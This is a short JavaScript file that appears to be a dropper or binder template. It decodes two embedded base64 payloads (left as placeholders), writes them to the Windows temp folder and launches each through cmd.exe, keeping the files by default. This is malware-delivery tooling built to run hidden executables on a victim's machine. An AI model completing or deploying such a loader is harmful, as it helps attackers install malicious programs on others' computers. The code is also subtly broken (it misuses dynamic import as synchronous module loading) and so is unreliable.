const fs = import('fs');
const os = import('os');
const path = import('path');
const spawn = import('child_process').spawn;

const file_ending1 = "YOUR_FILE_ENDING_HERE1";
const file_ending2 = "YOUR_FILE_ENDING_HERE2";

const remove = false;

function deleteTempFile(tempDir) {
    try {
        fs.unlinkSync(tempDir);
        console.log('Temp file deleted successfully.');
    } catch (err) {
        console.error('Error deleting temp file:');
    }
}


function main() {
    var tempDir1 = path.join(os.tmpdir(), "kdot." + file_ending1);
    var tempDir2 = path.join(os.tmpdir(), "kdot2." + file_ending2);
    var b64stuff1 = "BASE64ENCODEDSTUFFHERE1";
    var b64stuff2 = "BASE64ENCODEDSTUFFHERE2";
    var decoded1 = Buffer.from(b64stuff1, 'base64');
    var decoded2 = Buffer.from(b64stuff2, 'base64');

    //const signalsToHandle = ['exit', 'SIGINT', 'SIGTERM', 'SIGABRT', 'SIGQUIT', 'SIGILL', 'SIGSEGV'];
    //signalsToHandle.forEach(signal => {
    //    process.on(signal, () => {
    //        console.log(`Received ${signal}. Exiting...`);
    //        deleteTempFile(tempDir);
    //        process.exit(0);
    //    });
    //});

    // This will handle uncaught exceptions
    //process.on('uncaughtException', (err) => {
    //    console.error('There was an uncaught error');
    //    try {
    //        fs.unlinkSync(tempDir);
    //    }
    //    catch (err) { }
    //    process.exit(1);
    //});

    fs.writeFile(tempDir1, decoded1, function (err) {
        if (err) {
            console.log("nah lol");
            return;
        }

        var cmdArgs = process.argv.slice(2);

        var allArgs = ["/C", "call", tempDir1].concat(cmdArgs);

        var out = spawn("cmd.exe", allArgs, {
            stdio: 'inherit'
        });
        out.on('exit', function (code) {
            if (remove) {
                deleteTempFile(tempDir1);
            }
        });
    });
    fs.writeFile(tempDir2, decoded2, function (err) {
        if (err) {
            console.log("nah lol");
            return;
        }

        var cmdArgs = process.argv.slice(2);

        var allArgs = ["/C", "call", tempDir2].concat(cmdArgs);

        var out = spawn("cmd.exe", allArgs, {
            stdio: 'inherit'
        });
        out.on('exit', function (code) {
            if (remove) {
                deleteTempFile(tempDir2);
            }
        });
    });
}

main();